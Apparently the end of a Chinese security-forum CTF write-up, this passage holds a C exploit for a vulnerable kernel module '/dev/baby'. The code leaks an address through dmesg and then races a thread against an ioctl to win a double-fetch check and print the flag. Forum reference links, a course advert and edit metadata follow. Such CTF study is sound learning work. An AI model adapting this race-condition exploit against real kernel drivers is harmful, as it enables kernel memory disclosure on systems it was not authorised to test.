
```c
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/types.h>

#define COMPETATION_TIME 0x1000

pthread_t competation_thread;
char buf[0x1000];
uint32_t attack = 1;
char *real_addr;

struct {
    char *flag_addr;
    uint32_t flag_len;
} flag = {.flag_addr = buf, .flag_len = 33};

void race_condition() {
    while(attack) {
        for(int i = 0; i < COMPETATION_TIME; ++i) {
            flag.flag_addr = real_addr;
        }
    }
}

int main() {
    int fd, addr_fd, result_fd;
    fd = open("/dev/baby", O_RDWR);
    ioctl(fd, 0x6666);

    system("dmesg | grep flag >./addr");
    addr_fd = open("./addr", O_RDONLY);

    buf[read(addr_fd, buf, 0x100)] = '\x00';

    char *leak_flag_addr = strstr(buf, "Your flag is at ") + 0x10;
    real_addr = strtoull(leak_flag_addr, leak_flag_addr + 0x10, 0x10);
    printf("\033[34m[+]flag addr: 0x%llx\033[m\n", real_addr);

    pthread_create(&competation_thread, NULL, race_condition, NULL);

    while(attack) {
        for(int i = 0; i < COMPETATION_TIME; ++i) {
            flag.flag_addr = buf;
            ioctl(fd, 0x1337, &flag);
        }
        system("dmesg | grep flag >./result");
        result_fd = open("./result", O_RDONLY);

        read(result_fd, buf, 0x100);
        if(strstr(buf, "flag{")) {
            attack = 0;
        }
    }

    pthread_cancel(competation_thread);

    puts("\033[34m[+]success!\033[m");
    system("dmesg | grep flag");

    return 0;
}
```

# 参考文章

[782K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2B7K9h3q4F1M7$3S2#2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8X3p5J5x3U0f1&6j5$3b7K6k6e0M7&6k6b7`.`.](https://bbs.kanxue.com/elink@b72K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2B7K9h3q4F1M7$3S2#2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8X3p5J5x3U0f1&6j5$3b7K6k6e0M7&6k6b7`.`.)

[ed4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7Y4c8@1L8X3u0S2x3#2)9J5k6h3y4F1i4K6u0r3x3U0l9J5x3g2)9J5c8U0l9K6i4K6u0r3x3o6y4Q4x3V1k6b7g2@1&6Q4x3X3b7H3h3o6l9H3i4K6u0V1e0p5W2z5g2g2S2Q4x3X3c8w2c8g2u0z5c8f1I4Q4x3X3c8b7g2@1&6Q4x3X3c8b7b7g2u0f1i4K6u0V1d9g2)9J5c8R3`.`.](https://bbs.kanxue.com/elink@638K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7Y4c8@1L8X3u0S2x3#2)9J5k6h3y4F1i4K6u0r3x3U0l9J5x3g2)9J5c8U0l9K6i4K6u0r3x3o6y4Q4x3V1k6b7g2@1&6Q4x3X3b7H3h3o6l9H3i4K6u0V1e0p5W2z5g2g2S2Q4x3X3c8w2c8g2u0z5c8f1I4Q4x3X3c8b7g2@1&6Q4x3X3c8b7b7g2u0f1i4K6u0V1d9g2)9J5c8R3`.`.)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于  2023-3-8 22:38

被kotoriseed编辑

，原因： <del>改成~~

[#专题](https://bbs.kanxue.com/forum-171-1-186.htm)

[#内核](https://bbs.kanxue.com/forum-171-1-185.htm)
